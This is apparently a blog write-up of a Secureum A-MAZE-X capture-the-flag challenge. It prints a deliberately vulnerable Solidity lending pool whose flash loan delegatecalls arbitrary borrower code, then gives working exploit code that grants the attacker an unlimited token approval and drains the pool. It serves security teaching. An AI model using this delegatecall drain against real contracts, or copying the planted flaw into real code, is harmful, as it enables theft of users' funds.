---
layout: post
title: Secureum A-MAZE-X Stanford - Challenge 1
date:  2022-09-13
tags: Secureum
---
[Secureum A-MAZE-X Stanford Github repo](https://github.com/secureum/DeFi-Security-Summit-Stanford) 

## Challenge 1: What a nice Lender Pool!
Secureum has raised a lot of Ether and decided to buy a bunch of InSecureumTokens ($ISEC) in order to make them available to the community via flash loans. This is made possible by means of the InSecureumLenderPool contract. <br />

📌 Upon deployment, the InSecureumToken contract mints an initial supply of 10 $ISEC to the contract deployer. <br />

📌 The InSecureumLenderPool contract operates with $ISEC.<br />

📌 The contract deployer transfers all of their $ISEC to the InSecureumLenderPool contract.<br />

📌 The idea is that anyone can deposit $ISECs to enlarge the pool's resources.<br />

Will you be able to steal the $ISECs from the InSecureumLenderPool? 😈😈😈

## Contract
`InSecureumLenderPool.sol` ( The contracts that we will hack. )
``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Some ideas for this challenge were taken from damn vulnerable defi
contract InSecureumLenderPool {
    using Address for address;
    using SafeERC20 for IERC20;

    /// @dev Token contract address to be used for lending.
    //IERC20 immutable public token;
    IERC20 public token;
    /// @dev Internal balances of the pool for each user.
    mapping(address => uint) public balances;

    // flag to notice contract is on a flashloan
    bool private _flashLoan;

    /// @param _token Address of the token to be used for the lending pool.
    constructor (address _token) {
        token = IERC20(_token);
    }

    /// @dev Deposit the given amount of tokens to the lending 
    ///      pool. This will add _amount to balances[msg.sender] and
    ///      transfer _amount tokens to the lending pool.
    /// @param _amount Amount of token to deposit in the lending pool
    function deposit(uint256 _amount) external {
        require(!_flashLoan, "Cannot deposit while flash loan is active");
        token.safeTransferFrom(msg.sender, address(this), _amount);
        balances[msg.sender] += _amount;
    }
    
    /// @dev Withdraw the given amount of tokens from the lending pool.
    function withdraw(uint256 _amount) external {
        require(!_flashLoan, "Cannot withdraw while flash loan is active");
        balances[msg.sender] -= _amount;
        token.safeTransfer(msg.sender, _amount);
    }   

    /// @dev Give borrower all the tokens to make a flashloan.
    ///      For this with get the amount of tokens in the lending pool before, then we give
    ///      control to the borrower to make the flashloan. After the borrower makes the flashloan
    ///      we check if the lending pool has the same amount of tokens as before.
    /// @param borrower The contract that will have access to the tokens
    /// @param data Function call data to be used by the borrower contract.
    function flashLoan(
        address borrower,
        bytes calldata data
    )
        external
    {
        uint256 balanceBefore = token.balanceOf(address(this));
        
        _flashLoan = true;
        
        borrower.functionDelegateCall(data);

        _flashLoan = false;

        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```
`InSecureumToken.sol`
``` solidity 
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract InSecureumToken is ERC20 {

    // Decimals are set to 18 by default in `ERC20`
    constructor(uint256 _supply) ERC20("InSecureumToken", "ISEC") {
        _mint(msg.sender, _supply);
    }

}
```

## Writeup
1. Finish the `Exploit` contract in `test/Challenge1.t.sol`.
    ``` solidity
    contract Exploit {
        function flashloanCallback(IERC20 token, address testAddress) public {
            token.approve(testAddress, type(uint256).max);
        }
    }
    ```
2. Add below code to `testChallenge` function.
    ``` solidity
    Exploit exploit = new Exploit();

    target.flashLoan(
        address(exploit),
        abi.encodeWithSelector(
            Exploit.flashloanCallback.selector,
            token, 
            player
        )
    );

    IERC20(token).transferFrom(address(target), player, IERC20(token).balanceOf(address(target)));

    ```
3. Run `forge test --match-path test/Challenge1.t.sol`

## Reference 
[Function selector](https://solidity-by-example.org/function-selector/)
[Ventral.digital](https://ventral.digital/posts/2022/8/27/secureum-a-maze-x-stanford-ctf)